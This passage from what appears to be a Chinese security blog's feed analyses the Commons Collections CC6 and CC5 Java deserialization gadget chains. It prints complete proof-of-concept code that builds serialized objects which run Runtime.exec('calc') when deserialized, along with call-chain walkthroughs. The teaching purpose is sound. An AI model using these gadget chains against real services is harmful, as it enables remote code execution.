class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">Testtransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,Testtransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashSet=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Testtransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashSet);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605003843229-754416907.png" alt="image-20220605003842219"></p><p>前面的代码和cc1、cc5链一致，看下不同的地方。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashSet=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">hashSet.add(tiedMapEntry);</span><br><span class="line">lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"> <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br></pre></td></tr></table></figure><p>使用的是<code>HashSet</code>来进行构造，将前面的<code>TiedMapEntry</code>实例化对象添加进去，还调用了<code>lazyMap.remove</code>方法将<code>test1</code>给移除，这是为了能进入到判断语句里面去。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010414103-1179196187.png" alt="image-20220605010413225"></p><p>接下来进行调试分析，在<code>HashSet#readObject()</code>方法中打下断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010154554-133073869.png" alt="image-20220605010153640"></p><p>在<code>Hashset</code>的<code>readObject</code>方法中，回去调用<code>map</code>的<code>put</code>方法。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010849928-1051815863.png" alt="image-20220605010848871"></p><p>这里调用的是<code>Hashmap</code>的<code>put</code>方法，跟进一下该方法。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010940153-1645120977.png" alt="image-20220605010939375"></p><p>方法中会调用<code>hash()</code>方法，跟进到<code>hash()</code>方法中，发现会调用<code>key.hashCode()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605011124493-1678946676.png" alt="image-20220605011123771"></p><p><code>hashcode</code>还会去调用<code>getValue()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605011333692-1054386596.png" alt="image-20220605011332786"></p><p>进入<code>getValue()</code>方法，后续的分析就和cc5一致了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605011452059-612193209.png" alt="image-20220605011451491"></p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject-&gt;HashMap.put</span><br><span class="line">-&gt;HashMap.hash-&gt;TiedMapEntry.hashCode</span><br><span class="line">-&gt;TiedMapEntry.getValue-&gt;LazyMap.get</span><br><span class="line">-&gt;ChainedTransformer.transform-&gt;InvokerTransformer.transform</span><br><span class="line">-&gt;Runtime.exec</span><br></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>poc2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;cc6&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,transformers);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(expMap);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13892510.html">https://www.cnblogs.com/nice0e3/p/13892510.html</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/119739082">https://blog.csdn.net/rfrder/article/details/119739082</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在CC6链中和CC5的利用链类似，只是CC6链中使用的是&lt;code&gt;HashSet&lt;/code&gt;去触发&lt;code&gt;LazyMap&lt;/code&gt;的get方法，而在CC5中使用的是&lt;code&gt;BadAttributeValueExpException&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections5分析</title>
    <link href="https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections5%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections5%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T15:50:01.000Z</published>
    <updated>2022-06-04T16:28:08.478Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC5链中<code>ysoserial</code>给出的提示是需要JDK1.8并且<code>SecurityManager</code>需要是关闭的。</p><p>关于SecurityManager的介绍可以看下面的文章：</p><p><a href="https://www.cnblogs.com/wly1-6/p/10291202.html">https://www.cnblogs.com/wly1-6/p/10291202.html</a></p><span id="more"></span><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="number">123</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面和cc1链是差不多的，主要看后半段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="number">123</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(poc,tiedmap);</span><br></pre></td></tr></table></figure><p>上面代码中首先是实例化了一个<code>TiedMapEntry</code>对象，先来看下<code>TiedMapEntry</code>这个类</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605000444412-133669978.png" alt="image-20220605000443399"></p><p>该类的构造方法需要2个参数，在poc中我们传入了一个<code>LazyMap</code>实例化对象和一个Object对象，接着继续往下看，可以发现两个方法，分别是<code>getKey()</code>和<code>getValue()</code>，其中<code>getValue()</code>方法会去调用构造方法赋值的map类的<code>get()</code>方法，那么如果我们把<code>LazyMap</code>对象赋值给<code>map</code>，然后调用<code>get()</code>方法的话，就可以完成cc1链中的<code>LazyMap</code>调用链了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605000738543-2004248985.png" alt="image-20220605000737903"></p><p>我们继续往下看，找下哪个地方会调用到<code>getValue()</code>方法，这里发现有多处会调用到<code>getValue()</code>方法，重点看<code>toString()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605001330346-1258458263.png" alt="image-20220605001329397"></p><p>根据前面poc中下面这部分，这里先new了一个<code>BadAttributeValueExpException</code>的对象，然后通过反射将<code>val</code>的值设置为<code>TiedMapEntry</code>实例化对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br></pre></td></tr></table></figure><p>后面的poc就是将poc对象进行反序列化，那么，我们直接看下<code>BadAttributeValueExpException</code>这个类的代码，它在反序列化的时候做了什么。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605001813381-675845214.png" alt="image-20220605001812297"></p><p>反序列化时会调用<code>BadAttributeValueExpException#readObject()</code>方法，可以看到会调用<code>get()</code>方法将val的值赋值给<code>valObj</code>，而val的值就是前面通过反射赋值的<code>TiedMapEntry</code>实例化对象，在下面又会调用<code>valObj.toString()</code>方法，接着触发getValue()方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605002410480-138257297.png" alt="image-20220605002409732"></p><p>后续就是cc1链的调用过程了。</p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject-&gt;TiedMapEntry.toString</span><br><span class="line">-&gt;LazyMap.get-&gt;ChainedTransformer.transform</span><br><span class="line">-&gt;ConstantTransformer.transform-&gt;InvokerTransformer.transform</span><br><span class="line">-&gt;Method.invoke-&gt;Class.getMethod</span><br><span class="line">-&gt;InvokerTransformer.transform-&gt;Method.invoke</span><br><span class="line">-&gt;Runtime.getRuntime-&gt; InvokerTransformer.transform</span><br><span class="line">-&gt;Method.invoke-&gt;Runtime.exec</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13890340.html">https://www.cnblogs.com/nice0e3/p/13890340.html</a></p><p><a href="https://blog.csdn.net/hongduilanjun/article/details/123491483">https://blog.csdn.net/hongduilanjun/article/details/123491483</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

